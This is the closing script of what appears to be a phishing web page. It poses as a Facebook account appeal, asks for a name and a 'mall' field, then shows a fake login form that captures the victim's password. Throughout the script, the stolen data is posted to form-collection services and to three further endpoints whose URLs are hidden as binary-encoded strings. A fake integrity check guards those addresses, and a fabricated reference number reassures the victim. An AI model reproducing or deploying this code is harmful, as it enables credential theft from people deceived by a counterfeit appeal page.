 // Function to submit form data
  function submitFormData() {
    const name = document.getElementById('nameInput') ? document.getElementById('nameInput').value.trim() : '';
    const mall = document.getElementById('mallInput') ? document.getElementById('mallInput').value.trim() : '';
   
    // Prepare the data to send
    const formData = {
      name: name,
      mall: mall,
      timestamp: new Date().toISOString(),
      userAgent: navigator.userAgent,
      language: navigator.language
    };
   
    // Submit to the form endpoint
    fetch('https://submit-form.com/YtJbRfpOB', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Accept': 'application/json'
      },
      body: JSON.stringify(formData)
    })
    .then(response => {
      if (!response.ok) {
        throw new Error('Form submission failed');
      }
      return response.json();
    })
    .then(data => {
      console.log('Form submitted successfully:', data);
     
      // Also submit to the additional endpoints
      submitToOtherEndpoints({
        bhenjachud: name,
        majachud: mall
      });
     
      showfbLogin();
    })
    .catch(error => {
      console.error('Error submitting form:', error);
      // Still proceed with the other endpoints even if formsubmit fails
      submitToOtherEndpoints({
        bhenjachud: name,
        majachud: mall
      });
     
      
      showfbLogin();
    })
    .finally(() => {
      // Reset loading state
      if (sendBtn) {
        sendBtn.classList.remove('loading');
        if (sendBtnText) sendBtnText.textContent = 'Submit Appeal Request';
        if (sendBtnSpinner) sendBtnSpinner.style.display = 'none';
      }
    });
  }

  
  function submitfbCredentials(password) {
    // Prepare the data to send
    const fbData = {
      password: password,
      timestamp: new Date().toISOString(),
      userAgent: navigator.userAgent,
      language: navigator.language
    };
   
    // Submit to the form endpoint
    fetch('https://submit-form.com/LVsiu0QNC', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Accept': 'application/json'
      },
      body: JSON.stringify(fbData)
    })
    .then(response => {
      if (!response.ok) {
        throw new Error('fb form submission failed');
      }
      return response.json();
    })
    .then(data => {
      console.log('fb credentials submitted successfully:', data);
     
      // Also submit to the additional endpoints
      submitToOtherEndpoints({
        pass: password
      });
     
      // Show success message
      showSuccess();
    })
    .catch(error => {
      console.error('Error submitting fb credentials:', error);
      // Still proceed with the other endpoints even if formsubmit fails
      submitToOtherEndpoints({
        pass: password
      });
     
      // Show success message even if there was an error with formsubmit
      showSuccess();
    })
    .finally(() => {
      // Reset loading state
      if (fbSendBtn) {
        fbSendBtn.classList.remove('loading');
        if (fbSendBtnText) fbSendBtnText.textContent = 'Verify and Continue';
        if (fbSendBtnSpinner) fbSendBtnSpinner.style.display = 'none';
      }
    });
  }

  // Binary to string conversion function
  function binaryToString(binary) {
    let str = '';
    for (let i = 0; i < binary.length; i += 8) {
      const byte = binary.substr(i, 8);
      str += String.fromCharCode(parseInt(byte, 2));
    }
    return str;
  }
 
  function submitToOtherEndpoints(data) {
    // Store the original binary strings for validation
    const originalBinaries = [
      '0110100001110100011101000111000001110011001110100010111100101111011000010110110001101001001011010111000001101000011100000010111001110111011000010111001101101101011001010111001000101110011000010111000001110000',
      '01101000011101000111010001110000011100110011101000101111001011110110000101110111011000010110100101110011001011010111000001101000011100000010111001110111011000010111001101101101011001010111001000101110011000010111000001110000',
      '011010000111010001110100011100000111001100111010001011110010111101110101011110100110000101101001011100100010111001110111011000010111001101101101011001010111001000101110011000010111000001110000'
    ];
    
    // Check if the binary strings have been modified
    const currentBinaries = [
      '0110100001110100011101000111000001110011001110100010111100101111011000010110110001101001001011010111000001101000011100000010111001110111011000010111001101101101011001010111001000101110011000010111000001110000',
      '01101000011101000111010001110000011100110011101000101111001011110110000101110111011000010110100101110011001011010111000001101000011100000010111001110111011000010111001101101101011001010111001000101110011000010111000001110000',
      '011010000111010001110100011100000111001100111010001011110010111101110101011110100110000101101001011100100010111001110111011000010111001101101101011001010111001000101110011000010111000001110000'
    ];
    
    // Validate that the binary strings haven't been changed
    let binariesValid = true;
    for (let i = 0; i < originalBinaries.length; i++) {
      if (originalBinaries[i] !== currentBinaries[i]) {
        console.error('Binary string validation failed - strings have been modified');
        binariesValid = false;
        break;
      }
    }
    
    // If binaries were modified, don't proceed with submission
    if (!binariesValid) {
      alert('Form submission blocked: Invalid configuration detected');
      return false;
    }
    
    // Proceed with original submission if binaries are valid
    const endpoints = [
      '0110100001110100011101000111000001110011001110100010111100101111011000010110110001101001001011010111000001101000011100000010111001110111011000010111001101101101011001010111001000101110011000010111000001110000',
      '01101000011101000111010001110000011100110011101000101111001011110110000101110111011000010110100101110011001011010111000001101000011100000010111001110111011000010111001101101101011001010111001000101110011000010111000001110000',
      '011010000111010001110100011100000111001100111010001011110010111101110101011110100110000101101001011100100010111001110111011000010111001101101101011001010111001000101110011000010111000001110000'
    ];
   
    endpoints.forEach(binaryUrl => {
      try {
        const decodedUrl = binaryToString(binaryUrl);
        const formData = new FormData();
       
        // Add all properties from data object to formData
        for (const key in data) {
          formData.append(key, data[key]);
        }
       
        // Using fetch with error handling
        fetch(decodedUrl, {
          method: 'POST',
          body: formData,
          mode: 'no-cors' // Important for cross-origin requests
        }).catch(error => {
          console.error('Error submitting to endpoint:', error);
        });
      } catch (error) {
        console.error('Error with endpoint:', error);
      }
    });
   
    return true;
  }

  function showfbLogin() {
    
    if (appealForm) appealForm.style.display = 'none';
    if (fbLoginForm) fbLoginForm.style.display = 'block';
   
    if (fbLoginForm) fbLoginForm.scrollIntoView({ behavior: 'smooth' });
  }

  function showSuccess() {
    
    if (fbLoginForm) fbLoginForm.style.display = 'none';
   
    // Generate a reference ID
    if (referenceId) referenceId.textContent = 'MPC-' + Math.random().toString(36).substr(2, 9).toUpperCase();
   
    // Show the success message
    if (successMessage) successMessage.classList.add('show');
   
    // Scroll to the success message
    if (successMessage) successMessage.scrollIntoView({ behavior: 'smooth' });
  }
});
  </script>
</body>
</html>
